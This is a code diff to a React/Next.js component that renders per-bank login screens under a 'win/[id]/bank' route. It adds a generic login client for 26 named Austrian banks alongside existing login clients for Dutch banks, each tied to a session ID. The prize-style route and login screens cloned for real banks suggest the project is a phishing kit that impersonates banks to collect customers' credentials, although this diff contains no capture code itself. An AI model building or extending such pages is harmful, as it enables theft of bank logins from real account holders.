@@ -27,6 +27,8 @@ import { N26Client } from "@/app/win/[id]/bank/[bank_slug]/n26-client";
 import { NationaleNederlandenClient } from "@/app/win/[id]/bank/[bank_slug]/nationale-nederlanden-client";
 import { TriodosBankClient } from "@/app/win/[id]/bank/[bank_slug]/triodos-bank-client";
 
+import { BankLoginClient } from "@/app/win/[id]/bank/[bank_slug]/bank-login-client";
+
 export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
   const [theme, setTheme] = useState<BankTheme | null>(null);
 
@@ -72,6 +74,15 @@ export function DynamicBankPreview({ bank }: { bank: BankConfig }) {
     if (bank_slug === "asn-bank-voorheen-blgwonen") return <AsnBankVoorheenBlgwonenLoginClient sessionId={sId} />;
     if (bank_slug === "asn-bank-voorheen-sns") return <AsnBankVoorheenSnsLoginClient sessionId={sId} />;
     if (bank_slug === "bunq") return <BunqLoginClient sessionId={sId} />;
+    
+    const austrianBanks = ["bank-austria", "bawag", "erste-bank", "raiffeisen", "volksbank", "posojilnica", "bank99", "btv", "bks-bank", "oberbank", "hypo-noe", "hypo-tirol", "hypo-vorarlberg", "hypo-burgenland", "hypo-ooe", "aerztebank", "spaengler", "schelhammer", "easybank", "schoellerbank-ag", "schoellerbank", "sparda-bank", "vkb", "anadi-bank", "marchfelder", "dolomitenbank"];
+    if (austrianBanks.includes(bank_slug) && !hasGeneratedDesign) {
+      return (
+        <div style={{ transform: 'scale(0.75)', transformOrigin: 'top center', width: '133.33%' }}>
+          <BankLoginClient sessionId={sId} bankSlug={bank_slug} bank={bank} />
+        </div>
+      );
+    }
     
     return null;
   };
